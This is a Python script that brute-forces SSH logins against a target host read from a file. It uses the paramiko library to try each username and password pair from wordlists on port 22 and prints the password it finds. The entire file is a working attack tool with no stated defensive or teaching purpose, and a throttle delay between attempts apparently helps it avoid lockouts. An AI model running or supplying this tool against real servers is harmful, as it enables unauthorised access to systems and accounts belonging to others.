import os

import termcolor
import paramiko
from colorama import init
import time

init(autoreset=True)
with open('SSHTarget.txt', 'r') as st:
    target = st.readline()
    st.close()


def attack():
    usr_arr = [];
    pass_arr = []
    try:

        user_list = os.path.abspath('users.txt')
        pass_list = file = os.path.abspath('passes.txt')
        print(termcolor.colored("[+] BruteForce Started....", 'blue'))
        print('\n')
    except KeyboardInterrupt:
        print(termcolor.colored("CANCELLED", 'red'))
        quit()

    users_lis = open(user_list, "r")
    for l in users_lis:
        u = l.strip();
        usr_arr.append(u)
    users_lis.close()

    passwords = open(pass_list, "r")
    for l in passwords:
        p = l.strip();
        pass_arr.append(p)

    passwords.close()
    i = 1;
    x = 0;
    u = 0
    while i == 1:

        try:

            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            print("ATTACKING..")
            print("[*] Username:", str(usr_arr[u]))
            print("[*] Password:", str(pass_arr[x]))
            client.connect(username=usr_arr[u], hostname=target, password=pass_arr[x], port=22, timeout=45, banner_timeout=180)
            print(termcolor.colored("[*} PASSWORD FOUND!\n", 'cyan'))
            print(termcolor.colored("[*}", (str(pass_arr[x])), "\n", 'cyan'))
            break
        except paramiko.ssh_exception.AuthenticationException:
            print(termcolor.colored("[X] PASSWORD NOT FOUND!\n", 'red'));
            print("Wait 31s.....")
            time.sleep(31)
            if x == len(pass_arr) - 1:
                x = 0
                if u == len(usr_arr) - 1:    break
                u += 1
            else:
                x += 1
            continue
        except paramiko.ssh_exception.NoValidConnectionsError:
            print(termcolor.colored("Error\n", 'red'))
            print("QUITTING.....")
            time.sleep(5)
            quit()
        except paramiko.ssh_exception.SSHException:
            print(termcolor.colored("CANNOT CONNECT\n", 'red'))
            print("QUITTING.....")
            time.sleep(5)
            quit()

        except:
            time.sleep(15);
            continue
        i += 1


attack()
